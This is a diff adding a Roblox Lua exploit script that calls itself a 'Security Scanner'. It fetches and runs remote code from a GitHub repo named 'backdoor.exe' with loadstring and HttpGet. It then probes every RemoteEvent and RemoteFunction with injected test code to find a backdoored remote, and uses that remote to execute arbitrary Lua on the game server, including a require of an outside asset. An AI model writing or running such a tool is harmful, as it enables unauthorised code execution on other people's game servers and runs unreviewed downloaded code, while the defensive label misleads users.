@@ -1,0 +1,369 @@
+-- Services
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local JointsService = game:GetService("JointsService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+
+-- 兼容性处理
+local requestFunction
+if syn and syn.request then
+    requestFunction = syn.request
+elseif http_request then
+    requestFunction = http_request
+elseif HttpService and HttpService.request then
+    requestFunction = HttpService.request
+end
+
+local setClipboardFunction = setclipboard or toclipboard or writeclipboard or function(text)
+    if setclipboard then setclipboard(text)
+    elseif toclipboard then toclipboard(text)
+    elseif writeclipboard then writeclipboard(text)
+    else
+        warn("Clipboard function not available")
+    end
+end
+
+-- Variables
+local LocalPlayer = Players.LocalPlayer
+local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
+
+-- 缓存常用函数
+local tableFind = table.find
+local taskSpawn = task.spawn or spawn
+local taskWait = task.wait or wait
+local mathRandom = math.random
+
+-- 状态变量
+local attached = false
+local backdoor = nil
+local scanInProgress = false
+
+-- 扫描位置配置
+local scanLocations = {
+    ReplicatedStorage,
+    Workspace,
+    Lighting,
+    Players,
+    CoreGui,
+    game:GetService("ServerScriptService"),
+    game:GetService("ServerStorage"),
+    game:GetService("StarterPack"),
+    game:GetService("StarterPlayer"),
+    game:GetService("StarterGui")
+}
+
+-- 过滤列表（不扫描这些位置）
+local excludeLocations = {
+    [JointsService] = true,
+    [RobloxReplicatedStorage] = true
+}
+
+-- Constants
+local INV_CODE = "xJHCqm84cW"
+local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))
+
+-- 清理之前的实例
+if RobloxGui and RobloxGui:FindFirstChild("V6") then
+    RobloxGui.V6:Destroy()
+end
+
+-- 安全地加载UI
+local Variables
+local function safeLoadUI()
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
+    end)
+    
+    if success then
+        return result
+    else
+        -- 备用UI加载方案
+        warn("Failed to load main UI: " .. tostring(result))
+        return {
+            UI = {
+                Main = {Active = true, Draggable = true},
+                Destroy = function() end
+            },
+            Topbar = {
+                Status = {Text = "Error"},
+                CloseButton = {MouseButton1Click = {Connect = function() end}},
+                R6Button = {MouseButton1Click = {Connect = function() end}}
+            },
+            MainButtons = {
+                ScanButton = {MouseButton1Click = {Connect = function() end}},
+                ExecuteButton = {MouseButton1Click = {Connect = function() end}},
+                ClearButton = {MouseButton1Click = {Connect = function() end}},
+                HideButton = {MouseButton1Click = {Connect = function() end}},
+                InviteButton = {MouseButton1Click = {Connect = function() end}}
+            },
+            SourceFrame = {
+                Source = {Text = "", Visible = true}
+            }
+        }
+    end
+end
+
+Variables = safeLoadUI()
+
+-- 通知函数
+local function notify(text, callback, button1, button2)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Security Scanner",
+            Duration = 3,
+            Text = text,
+            Callback = callback,
+            Button1 = button1,
+            Button2 = button2
+        })
+    end)
+end
+
+-- 验证远程对象
+local function validRemote(remote)
+    if not remote or not remote.Parent then return false end
+    
+    local remoteClass = remote.ClassName
+    if remoteClass ~= "RemoteEvent" and remoteClass ~= "RemoteFunction" then
+        return false
+    end
+    
+    -- 排除系统远程对象
+    local parent = remote.Parent
+    if excludeLocations[parent] or remote:IsDescendantOf(RobloxReplicatedStorage) then
+        return false
+    end
+    
+    -- 排除特定模式的远程对象
+    if parent == ReplicatedStorage and remote:FindFirstChild("__FUNCTION") then
+        return false
+    end
+    
+    if remote.Name == "__FUNCTION" and parent.ClassName == "RemoteEvent" and parent.Parent == ReplicatedStorage then
+        return false
+    end
+    
+    return true
+end
+
+-- 安全执行远程调用
+local function safeRemoteCall(remote, code)
+    local remoteCode = tostring(mathRandom(100000, 999999))
+    remoteCodes = remoteCodes or {}
+    remoteCodes[remoteCode] = remote
+    
+    local testScript = string.format(
+        "local s=Instance.new('StringValue',workspace);s.Name='%s';s.Value='%s'",
+        STRING_VALUE_NAME, remoteCode
+    )
+    
+    local success, result = pcall(function()
+        if remote.ClassName == "RemoteEvent" then
+            remote:FireServer(testScript)
+        elseif remote.ClassName == "RemoteFunction" then
+            return remote:InvokeServer(testScript)
+        end
+    end)
+    
+    return success
+end
+
+-- 扫描位置
+local function scanLocation(location)
+    if not location or excludeLocations[location] then return false end
+    
+    local descendants = location:GetDescendants()
+    for _, descendant in ipairs(descendants) do
+        if scanInProgress == false then break end
+        
+        if validRemote(descendant) then
+            local success = safeRemoteCall(descendant, STRING_VALUE_NAME)
+            if success and Workspace:FindFirstChild(STRING_VALUE_NAME) then
+                local foundValue = Workspace:FindFirstChild(STRING_VALUE_NAME)
+                if foundValue and foundValue.Value and remoteCodes[foundValue.Value] then
+                    attached = true
+                    backdoor = remoteCodes[foundValue.Value]
+                    
+                    -- 清理测试对象
+                    pcall(function() foundValue:Destroy() end)
+                    return true
+                end
+            end
+        end
+    end
+    
+    return false
+end
+
+-- 主扫描函数
+local function scanGame()
+    if scanInProgress then
+        notify("Scan already in progress!")
+        return false
+    end
+    
+    scanInProgress = true
+    remoteCodes = {}
+    attached = false
+    backdoor = nil
+    
+    notify("Starting security scan...")
+    
+    -- 更新UI状态
+    if Variables.Topbar and Variables.Topbar.Status then
+        Variables.Topbar.Status.Text = "Scanning"
+    end
+    
+    local found = false
+    
+    -- 扫描配置的位置
+    for _, location in ipairs(scanLocations) do
+        if not scanInProgress then break end
+        if scanLocation(location) then
+            found = true
+            break
+        end
+    end
+    
+    -- 扫描其他游戏对象
+    if not found then
+        for _, child in ipairs(game:GetChildren()) do
+            if not scanInProgress then break end
+            if not table.find(scanLocations, child) and not excludeLocations[child] then
+                if scanLocation(child) then
+                    found = true
+                    break
+                end
+            end
+        end
+    end
+    
+    scanInProgress = false
+    
+    -- 更新结果
+    if found then
+        notify("Security vulnerability found!")
+        if Variables.Topbar and Variables.Topbar.Status then
+            Variables.Topbar.Status.Text = "Vulnerable"
+        end
+    else
+        notify("No vulnerabilities detected")
+        if Variables.Topbar and Variables.Topbar.Status then
+            Variables.Topbar.Status.Text = "Secure"
+        end
+    end
+    
+    return found
+end
+
+-- 执行脚本
+local function executeScript(scriptText)
+    if not attached or not backdoor then
+        local function handleResponse(response)
+            if response == "Yes" then
+                if scanGame() then
+                    executeScript(scriptText)
+                end
+            end
+        end
+        
+        local bindable = Instance.new("BindableFunction")
+        bindable.OnInvoke = handleResponse
+        notify("Not connected to a server.\nScan for vulnerabilities?", bindable, "Yes", "No")
+        return
+    end
+    
+    local scriptToExecute = scriptText or (Variables.SourceFrame and Variables.SourceFrame.Source.Text or "")
+    if scriptToExecute == "" then return end
+    
+    local success, errorMsg = pcall(function()
+        if backdoor.ClassName == "RemoteEvent" then
+            backdoor:FireServer(scriptToExecute)
+        elseif backdoor.ClassName == "RemoteFunction" then
+            backdoor:InvokeServer(scriptToExecute)
+        end
+    end)
+    
+    if not success then
+        notify("Execution failed: " .. tostring(errorMsg))
+    end
+end
+
+-- Discord邀请功能
+local function promptDiscordInvite()
+    if not requestFunction then
+        setClipboardFunction(INV_CODE)
+        notify("Invite code copied to clipboard!")
+        return
+    end
+    
+    local success, result = pcall(function()
+        return requestFunction({
+            Url = "http://127.0.0.1:6463/rpc?v=1",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Origin"] = "https://discord.com"
+            },
+            Body = HttpService:JSONEncode({
+                cmd = "INVITE_BROWSER",
+                args = {code = INV_CODE},
+                nonce = HttpService:GenerateGUID(false)
+            })
+        })
+    end)
+    
+    if not success or (result and result.StatusCode ~= 200) then
+        setClipboardFunction(INV_CODE)
+        notify("Invite code copied to clipboard!")
+    else
+        notify("Discord invite sent! Check your Discord.")
+    end
+end
+
+-- UI事件绑定（安全版本）
+local function safeConnect(button, callback)
+    if button and button.MouseButton1Click then
+        local success = pcall(function()
+            return button.MouseButton1Click:Connect(callback)
+        end)
+        if not success then
+            warn("Failed to connect button: " .. tostring(button))
+        end
+    end
+end
+
+-- 初始化UI事件
+safeConnect(Variables.Topbar.CloseButton, function()
+    if Variables.UI then
+        Variables.UI:Destroy()
+    end
+end)
+
+safeConnect(Variables.Topbar.R6Button, function()
+    executeScript(string.format("require(3041175937):r6('%s')", LocalPlayer.Name))
+end)
+
+safeConnect(Variables.MainButtons.ScanButton, scanGame)
+safeConnect(Variables.MainButtons.ExecuteButton, executeScript)
+safeConnect(Variables.MainButtons.ClearButton, function()
+    if Variables.SourceFrame and Variables.SourceFrame.Source then
+        Variables.SourceFrame.Source.Text = ""
+    end
+end)
+
+safeConnect(Variables.MainButtons.HideButton, function()
+    if Variables.SourceFrame and Variables.SourceFrame.Source then
+        Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
+    end
+end)
+
+safeConnect(Variables.MainButtons.InviteButton, promptDiscordInvite)
+
+-- 初始化完成
+notify("Security Scanner loaded successfully!\nUse this tool responsibly.")
